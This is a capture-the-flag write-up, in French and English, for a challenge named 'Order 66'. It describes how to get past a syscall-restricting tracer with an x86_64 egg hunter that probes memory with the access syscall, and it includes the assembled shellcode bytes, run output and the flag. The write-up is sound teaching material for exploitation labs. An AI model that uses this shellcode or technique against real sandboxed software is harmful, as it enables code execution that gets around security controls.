# Order 66

## Write-up FR

En analysant le code, on constate que le programme attend une entrée utilisateur, qu’il exécute ensuite comme une instruction en assembleur.
Un mécanisme de traçage est en place pour restreindre certains appels système (syscalls). Dans notre cas, seuls les `syscalls` suivants sont autorisés : 
```bash
__NR_exit
__NR_open
__NR_close
__NR_read
__NR_write
__NR_access
__NR_sigaction
```
Cela signifie que nous ne pouvons pas exécuter une payload ouvrant un shell. 
Une autre approche pourrait consister à simplement ouvrir "flag.txt", le lire et l’afficher sur la sortie standard. Cependant, le traçage vérifie si le open effectué est autorisé, ce qui empêche cette méthode :
```bash
$ python sol.py 
[+] Opening connection to localhost on port 4444: Done
0x7a221a000000
[*] Switching to interactive mode
Follow the order, that's not the chosen one
[*] Got EOF while reading in interactive
```

Toutefois, on remarque qu’un payload cachée, `hidden_payload`, est présent dans la mémoire de l’exécutable. Ce payload est conçu pour ouvrir le fichier du flag et l’afficher. Juste avant ce payload, la chaîne `order66` apparaît deux fois dans la mémoire.
Notre objectif est donc d’implémenter un `Egg Hunter` en assembleur `x86_64` pour localiser et exécuter ce shellcode caché.

L'egg hunter doit parcourir la mémoire, tester si une adresse est accessible (sans provoquer de segmentation fault en lecture), puis rechercher la signature `order66`.

Heureusement, nous pouvons utiliser les syscalls `sigaction` et `access` pour tester l’accessibilité des pages mémoire.

De plus, le programme nous donne un indice sur l’emplacement du `hidden_shellcode` via cette ligne :
```c
printf("[Hint] %lx\n",hint & 0xFFFFFFF00000);
```
Cela signifie que nous devons tester `1 048 576` adresses.

```bash
$ nasm -f bin payload.s 
$ hexdump -v -e '"\\""x" 1/1 "%02x" ""' payload
\x48\x31\xf6\x48\x89\xf7\x48\xbf\x00\x00\x00\x00\x00\x70\x00\x00\x66\x81\xcf\xff\x0f\x48\xff\xc7\x6a\x15\x58\x0f\x05\x3c\xf2\x74\xef\xb8\x6f\x72\x64\x65\xaf\x75\xef\xb8\x72\x36\x36\x00\xaf\x75\xe7\xff\xd7
```
On écrit un programme Python qui récupère l’indice, modifie notre shellcode en conséquence et l’envoie au programme cible :
```bash
$ python sol.py 
[+] Opening connection to localhost on port 4444: Done
0x78d897b00000
[*] Switching to interactive mode
Congrate, you find the order 66:
polycyber{0rd3r_66_n0_m0r3_j3d1}[*] Got EOF while reading in interactive
```

## Write-up EN

By analyzing the code, we observe that the program waits for user input and then executes it as an assembly instruction.

A tracing mechanism is in place to restrict certain system calls (syscalls). In our case, only the following syscalls are allowed:
```bash
__NR_exit
__NR_open
__NR_close
__NR_read
__NR_write
__NR_access
__NR_sigaction
```
This means we cannot execute a payload that spawns a shell.

Another approach would be to simply open "flag.txt", read it, and print its contents to standard output. However, the tracer checks whether the open syscall being executed is authorized, preventing this method :
```bash
$ python sol.py 
[+] Opening connection to localhost on port 4444: Done
0x7a221a000000
[*] Switching to interactive mode
Follow the order, that's not the chosen one
[*] Got EOF while reading in interactive
```
However, we notice that a hidden payload, `hidden_payload`, is present in the executable’s memory. This payload is designed to open the flag file and display its contents. Just before this payload, the string `order66` appears twice in memory.
Our objective is to implement an `Egg Hunter` in `x86_64` assembly to locate and execute this hidden shellcode.
The egg hunter must scan memory, check whether an address is accessible (without causing a segmentation fault when reading), and search for the `order66` signature.

Fortunately, we can use the `sigaction` and `access` syscalls to check whether a memory page is accessible.
Additionally, the program provides a hint about the location of the `hidden_shellcode` with the following line:
```c
printf("[Hint] %lx\n", hint & 0xFFFFFFF00000);
```
This means we need to scan `1,048,576` addresses.

```bash
$ nasm -f bin payload.s 
$ hexdump -v -e '"\\""x" 1/1 "%02x" ""' payload
\x48\x31\xf6\x48\x89\xf7\x48\xbf\x00\x00\x00\x00\x00\x70\x00\x00\x66\x81\xcf\xff\x0f\x48\xff\xc7\x6a\x15\x58\x0f\x05\x3c\xf2\x74\xef\xb8\x6f\x72\x64\x65\xaf\x75\xef\xb8\x72\x36\x36\x00\xaf\x75\xe7\xff\xd7
```
We write a Python script that retrieves the hint, modifies our shellcode accordingly, and sends it to the target program:
```bash
$ python sol.py 
[+] Opening connection to localhost on port 4444: Done
0x78d897b00000
[*] Switching to interactive mode
Congrats, you found Order 66:
polycyber{0rd3r_66_n0_m0r3_j3d1}[*] Got EOF while reading in interactive
```

## Flag

`polycyber{0rd3r_66_n0_m0r3_j3d1}`